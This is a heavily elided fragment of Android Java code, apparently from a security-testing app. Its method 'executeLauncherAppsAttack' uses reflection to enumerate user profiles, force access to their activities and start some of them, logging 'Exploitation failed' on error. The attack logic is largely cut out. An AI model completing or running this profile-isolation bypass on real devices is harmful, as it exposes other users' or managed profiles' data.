...
// -------------------------------- Launcher Apps Attack ------------------------------------------
    ...
    public Result executeLauncherAppsAttack() {
        ...
        try {
            ...
            new Thread(() -> {
                try {
                    // Try to access user profiles via reflection
                    ...
                    if (!isManaged) {
                        try {
                            ...
                            alarmUi("Got " + allProfiles.size() + " total profiles");
                            for (Object profile : allProfiles) {
                                try {
                                    // Force access via reflection
                                    ...
                                    alarmUi("Accessed profile " + profile +
                                            " with " + activities.size() + " activities");

                                    // Try to start activities in profile
                                    if (!activities.isEmpty()) {
                                        for (int i = 0; i < Math.min(10, activities.size()); i++) {
                                            try {
                                                ...
                                                alarmUi("Started activity in user profile!");
                            ...
                            alarmUi("Exploitation failed: " + t.getMessage());
                        }
                    }
